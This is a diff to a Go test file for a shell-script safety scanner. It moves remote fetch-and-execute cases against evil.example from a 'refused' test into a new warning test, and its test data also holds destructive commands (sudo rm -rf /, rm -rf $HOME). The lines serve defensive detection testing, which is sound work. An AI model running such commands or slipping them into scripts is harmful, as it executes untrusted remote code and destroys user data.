@@ -13,13 +13,6 @@ func TestCheckScriptRefused(t *testing.T) {
 		{"empty", []byte("   \n")},
 		{"binary", []byte{0xff, 0xfe, 0x00, 0x01}},
 		{"control_char", []byte("#!/bin/sh\necho \x07hi\n")},
-		{"pipe_to_shell", []byte("#!/bin/sh\ncurl -fsSL https://evil.example/a | bash\n")},
-		{"pipe_via_tee_to_shell", []byte("#!/bin/sh\ncurl -fsSL https://evil.example/a | tee /tmp/x | bash\n")},
-		{"pipe_to_sudo_shell", []byte("#!/bin/sh\nwget -qO- https://evil.example/a | sudo -E bash\n")},
-		{"proc_sub_curl", []byte("#!/bin/bash\nbash <(curl -fsSL https://evil.example/a)\n")},
-		{"base64_decode", []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n")},
-		{"base64_extra_flags", []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -i -d\n")},
-		{"eval_subshell", []byte("#!/bin/sh\neval \"$(curl -fsSL https://evil.example/a)\"\n")},
 		{"rm_root", []byte("#!/bin/sh\nsudo rm -rf /\n")},
 		{"rm_home", []byte("#!/bin/sh\nrm -rf \"$HOME\"\n")},
 		{"rm_etc_glob", []byte("#!/bin/sh\nrm -rf /etc/*\n")},
@@ -32,6 +25,62 @@ func TestCheckScriptRefused(t *testing.T) {
 		if !Refused(fs) {
 			t.Errorf("%s: expected refused, got %+v", tc.name, fs)
 		}
+	}
+}
+
+func TestCheckScriptHighRiskWarnings(t *testing.T) {
+	cases := []struct {
+		name     string
+		script   []byte
+		wantRule string
+		wantLine int
+	}{
+		{"pipe_to_shell", []byte("#!/bin/sh\n\ncurl -fsSL https://evil.example/a | bash\n"), RulePipeToShell, 3},
+		{"pipe_via_tee_to_shell", []byte("#!/bin/sh\ncurl -fsSL https://evil.example/a | tee /tmp/x | bash\n"), RulePipeToShell, 2},
+		{"pipe_to_sudo_shell", []byte("#!/bin/sh\nwget -qO- https://evil.example/a | sudo -E bash\n"), RulePipeToShell, 2},
+		{"proc_sub_curl", []byte("#!/bin/bash\nbash <(curl -fsSL https://evil.example/a)\n"), RulePipeToShell, 2},
+		{"base64_decode", []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n"), RuleHidden, 2},
+		{"base64_extra_flags", []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -i -d\n"), RuleHidden, 2},
+		{"multibyte_hex_decode", []byte("#!/bin/sh\nprintf '\\x63\\x75\\x72\\x6c'\n"), RuleHidden, 2},
+		{"eval_subshell", []byte("#!/bin/sh\neval \"$(curl -fsSL https://evil.example/a)\"\n"), RuleHidden, 2},
+		{"inline_bash_c_curl", []byte("#!/bin/sh\nbash -c \"curl -fsSL https://evil.example/a | sh\"\n"), RuleHidden, 2},
+	}
+	for _, tc := range cases {
+		fs := CheckScript(tc.script, "/home/me")
+		if Refused(fs) {
+			t.Errorf("%s: expected warning (Refuse=false), got refused: %+v", tc.name, fs)
+			continue
+		}
+		if !NeedsCustomConfirm(fs) {
+			t.Errorf("%s: expected NeedsCustomConfirm=true, got %+v", tc.name, fs)
+		}
+		found := false
+		for _, f := range fs {
+			if f.Rule == tc.wantRule {
+				found = true
+				if f.Line != tc.wantLine || f.Snippet == "" {
+					t.Errorf("%s: expected line=%d and non-empty snippet, got %+v", tc.name, tc.wantLine, f)
+				}
+			}
+		}
+		if !found {
+			t.Errorf("%s: missing expected rule %s in %+v", tc.name, tc.wantRule, fs)
+		}
+	}
+}
+
+func TestCheckScriptSingleByteHexAndANSIAllowed(t *testing.T) {
+	// Hermes install.sh line 332 `$'\x7f'ELF*` and ANSI color escapes `\x1b[32m`
+	// must not trigger false-positive RuleHidden decoding findings.
+	hermes := []byte(`#!/usr/bin/env bash
+case "$hdr" in
+  $'\x7f'ELF*)
+    printf "\x1b[32mDetected ELF binary\x1b[0m\n"
+    ;;
+esac
+`)
+	if fs := CheckScript(hermes, "/home/me"); len(fs) != 0 {
+		t.Fatalf("Hermes ELF header and ANSI color escape falsely flagged: %+v", fs)
 	}
 }
 
